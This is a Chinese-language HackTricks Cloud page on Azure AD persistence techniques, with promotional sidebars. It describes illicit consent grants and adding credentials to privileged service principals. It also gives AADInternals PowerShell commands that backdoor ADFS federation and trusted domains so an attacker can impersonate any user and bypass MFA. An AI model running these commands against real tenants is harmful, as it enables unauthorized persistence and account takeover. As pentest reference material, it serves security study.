# Az - 持久性

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享您的黑客技巧。**

</details>

### 非法同意授权

默认情况下，任何用户都可以在 Azure AD 中注册应用程序。因此，您可以注册一个应用程序（仅适用于目标租户），该应用程序需要高影响权限并获得管理员同意（如果您是管理员，则可以批准）- 例如代表用户发送邮件、角色管理等。如果成功，这将使我们能够进行非常有成果的**钓鱼攻击**。

此外，您还可以接受该应用程序，并以您的用户身份保持对其的访问权限。

### 应用程序和服务主体

通过具有应用程序管理员、GA 或具有 microsoft.directory/applications/credentials/update 权限的自定义角色的特权，我们可以向现有应用程序添加凭据（密钥或证书）。

可以**针对具有高权限的应用程序**或**添加具有高权限的新应用程序**。

一个有趣的角色是**特权身份验证管理员角色**，因为它允许**重置全局管理员的密码**。

此技术还可以**绕过 MFA**。

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
* 对于基于证书的身份验证

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### 联合 - 令牌签名证书

在本地 AD 上拥有 **DA 特权**的情况下，可以创建和导入具有非常长有效期的**新令牌签名**和**令牌解密证书**。这将允许我们以任何我们知道其 ImuutableID 的用户身份登录。

以 **ADFS 服务器上的 DA 身份**运行以下命令来创建新证书（默认密码为 'AADInternals'），将其添加到 ADFS，禁用自动滚动并重新启动服务：
```powershell
New-AADIntADFSSelfSignedCertificates
```
然后，使用Azure AD更新证书信息：
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### 联合 - 受信任的域

在租户上具有GA特权的情况下，可以**添加一个新的域**（必须经过验证），将其身份验证类型配置为联合，并配置该域**信任特定的证书**（在下面的命令中为any.sts）和发行者：
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## 参考资料

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 PDF 版的 HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获得[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
